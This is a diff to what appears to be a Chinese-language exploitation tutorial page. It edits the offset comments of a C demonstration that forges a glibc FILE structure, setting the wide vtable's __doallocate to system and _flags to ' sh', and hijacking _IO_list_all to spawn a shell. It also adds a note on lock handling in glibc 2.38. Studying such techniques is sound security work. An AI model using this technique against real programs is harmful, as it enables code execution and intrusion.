@@ -878,22 +878,24 @@ int main() {
   fake_file->vtable = (struct _IO_jump_t *)(libc_base + 0x1e8f60);
 
   // all fields set:
-  // offset 0x00: fake_file->file._flags = " sh"
-  // offset 0x18: fake_file->file._wide_data->_IO_write_base = 0
-  // offset 0x20: fake_file->file._IO_write_base = 0
-  // offset 0x28: fake_file->file._IO_write_ptr = 1
-  // offset 0x30: fake_file->file._wide_data->_IO_buf_base = 0
-  // offset 0x68: fake_file->file._wide_data->_wide_vtable->__doallocate = system
-  // offset 0xa0: fake_file->file._wide_data = fake_file
-  // offset 0xc0: fake_file->file._mode = 0
-  // offset 0xd8: fake_file->vtable = _IO_wfile_jumps
-  // offset 0xe0: fake_file->file._wide_data->_wide_vtable = fake_file
+  // 0x00: fake_file->file._flags = " sh"
+  // 0x18: fake_file->file._wide_data->_IO_write_base = 0
+  // 0x20: fake_file->file._IO_write_base = 0
+  // 0x28: fake_file->file._IO_write_ptr = 1
+  // 0x30: fake_file->file._wide_data->_IO_buf_base = 0
+  // 0x68: fake_file->file._wide_data->_wide_vtable->__doallocate = system
+  // 0xa0: fake_file->file._wide_data = fake_file
+  // 0xc0: fake_file->file._mode = 0
+  // 0xd8: fake_file->vtable = _IO_wfile_jumps
+  // 0xe0: fake_file->file._wide_data->_wide_vtable = fake_file
 
   *list_all = fake_file;
 
   return 0;
 }
 ```
+
+注：从 glibc 2.38 开始，由于 [Always do locking when accessing streams (bug 15142, bug 14697)](https://github.com/bminor/glibc/commit/af130d27099651e0d27b2cf2cfb44dafd6fe8a26) 的改动，`_IO_cleanup` 会去获取 FILE 结构的锁，此时它的 `_lock` 字段需要指向一个合法的 `_IO_lock_t` 结构体，此时可以复用 stdin/stdout/stderr 已有的锁。
 
 ## 参考
 
